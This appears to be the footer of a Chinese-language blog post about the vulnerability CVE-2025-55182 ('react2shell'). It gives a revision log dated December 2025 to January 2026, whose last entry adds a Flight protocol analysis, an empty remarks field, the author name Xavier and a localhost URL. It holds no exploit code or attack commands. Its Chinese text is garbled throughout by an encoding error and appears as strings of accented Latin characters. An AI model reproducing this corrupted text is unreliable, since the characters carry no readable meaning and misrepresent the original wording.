- 2025-12-05 ï¼Œæ­¤æ¬¡ä¿®è®¢å†…å®¹ | æ–°å»º
- 2026-01-07ï¼ŒV0.5 ç‰ˆæœ¬ | ä¿®æ”¹
- 2026-01-16ï¼ŒV1.0 ç‰ˆæœ¬ | æ–°å¢ Flightåè®®åˆ†æ

å¤‡æ³¨ï¼š
- 

---

> ä½œè€…: Xavier  
> URL: http://localhost:1313/posts/cve-2025-55182_react2shell/  

